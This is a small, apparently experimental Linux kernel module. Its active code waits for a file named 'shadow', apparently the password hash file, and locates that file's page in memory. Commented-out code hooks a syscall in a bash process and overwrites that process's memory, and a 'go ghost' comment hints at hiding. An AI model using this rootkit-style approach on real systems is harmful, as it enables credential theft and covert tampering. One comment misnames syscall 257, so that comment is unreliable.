
#include "taskutil.h"
#include "regset.h"
#include "memutil.h"
#include "depend.h"
#include "address_space.h"

int init_module(void)
{
	//iterate_task();
	//print_memory_regions(get_task(1));
	//find_mapped_file("null", 4);

	/*struct task_struct* t = wait_task("test_file",6);
	print_fds(t);
	find_fd(t, "test_file", 9);*/
	struct file* filp = wait_fd("shadow", 6);
	find_page(filp, 0);
	printk("%s\n", get_file_name(filp));

	return 0;
}

void cleanup_module(void)
{
	printk("Module cleanup\n");
	//go ghost
}
MODULE_LICENSE("GPL");





//Old init_module below
/*
struct task_struct* ret;
struct mm_struct* mm;// = get_task(BASH_PID) -> mm;
unsigned long laddr;
struct page* page;
char* true_addr;
char* kmaddr;
char* string;
struct user_regs_struct* data;

spam_get_gen();

string = kmalloc(PATH_MAX,GFP_KERNEL);

ret = get_task(BASH_PID);
if(ret == 0){ //do a little error checking
	printk("Bad PID");
	return 0;
}



data = catch_syscall(257); //catch syscall number 257 which is readat()
laddr = (unsigned long)(data -> si);
mm = ret -> mm;
page = page_walk_safe(laddr, mm); //get page
if(page == NULL){
	printk("There was a problem getting the page");
	return 0;
}
kmaddr = (char*)kmap(page);

read_string(kmaddr,string,laddr);

true_addr = return_true_addr(kmaddr, laddr);
*(true_addr)= 'Q'; // - all of the mapping and qogchamp shit


kunmap(page);
kfree(string);
*/
